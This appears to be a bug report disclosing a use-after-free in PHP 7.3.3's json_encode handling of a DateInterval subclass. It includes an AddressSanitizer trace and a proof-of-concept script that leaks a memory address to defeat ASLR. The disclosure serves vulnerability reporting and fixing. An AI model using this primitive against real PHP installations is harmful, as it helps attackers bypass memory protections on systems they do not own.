@@ -1,0 +1,64 @@
+Description:
+------------
+Together with a recent apache vulnerability
+https://cfreal.github.io/carpe-diem-cve-2019-0211-apache-local-root.html
+
+a use after free 0day bug in PHP was disclosed.
+
+Just want to make sure you're aware of it. Compiling PHP 7.3.3 with ASAN gives me this stack trace:
+
+==22468==ERROR: AddressSanitizer: heap-use-after-free on address 0x606000006288 at pc 0x000001b53104 bp 0x7ffc38a68850 sp 0x7ffc38a68848
+READ of size 8 at 0x606000006288 thread T0
+    #0 0x1b53103 in ZEND_FETCH_OBJ_R_SPEC_UNUSED_CONST_HANDLER /f/php-7.3.3/Zend/zend_vm_execute.h:31199:8
+    #1 0x19ef40c in execute_ex /f/php-7.3.3/Zend/zend_vm_execute.h:55334:7
+    #2 0x183aa71 in zend_call_function /f/php-7.3.3/Zend/zend_execute_API.c:756:3
+    #3 0x1839366 in _call_user_function_ex /f/php-7.3.3/Zend/zend_execute_API.c:598:9
+    #4 0x1197b9a in php_json_encode_serializable_object /f/php-7.3.3/ext/json/json_encoder.c:490:17
+    #5 0x1197b9a in php_json_encode_zval /f/php-7.3.3/ext/json/json_encoder.c:567
+    #6 0x11a0491 in php_json_encode_array /f/php-7.3.3/ext/json/json_encoder.c:218:8
+    #7 0x1197e92 in php_json_encode_zval /f/php-7.3.3/ext/json/json_encoder.c:571:11
+    #8 0x11a0491 in php_json_encode_array /f/php-7.3.3/ext/json/json_encoder.c:218:8
+    #9 0x1197e92 in php_json_encode_zval /f/php-7.3.3/ext/json/json_encoder.c:571:11
+    #10 0x119528c in zif_json_encode /f/php-7.3.3/ext/json/json.c:286:2
+    #11 0x1bbbb10 in ZEND_DO_ICALL_SPEC_RETVAL_UNUSED_HANDLER /f/php-7.3.3/Zend/zend_vm_execute.h:645:2
+    #12 0x19ef40c in execute_ex /f/php-7.3.3/Zend/zend_vm_execute.h:55334:7
+    #13 0x19efcdf in zend_execute /f/php-7.3.3/Zend/zend_vm_execute.h:60881:2
+    #14 0x1889d94 in zend_execute_scripts /f/php-7.3.3/Zend/zend.c:1568:4
+    #15 0x16990b7 in php_execute_script /f/php-7.3.3/main/main.c:2630:14
+    #16 0x1cc58b3 in do_cli /f/php-7.3.3/sapi/cli/php_cli.c:997:5
+    #17 0x1cc23e2 in main /f/php-7.3.3/sapi/cli/php_cli.c:1392:18
+    #18 0x7faa220d64fa in __libc_start_main (/lib64/libc.so.6+0x244fa)
+    #19 0x424419 in _start (/f/php-7.3.3/sapi/cli/php+0x424419)
+
+
+Test script:
+---------------
+<?php
+
+class X extends DateInterval implements JsonSerializable
+{
+  public function jsonSerialize()
+  {
+    global $y, $p;
+    unset($y[0]);
+    $p = $this->y;
+    return $this;
+  }
+}
+
+function get_aslr()
+{
+  global $p, $y;
+  $p = 0;
+
+  $y = [new X('PT1S')];
+  json_encode([1234 => &$y]);
+  print("ADDRESS: 0x" . dechex($p) . "\n");
+
+  return $p;
+}
+
+get_aslr();
+
+
+
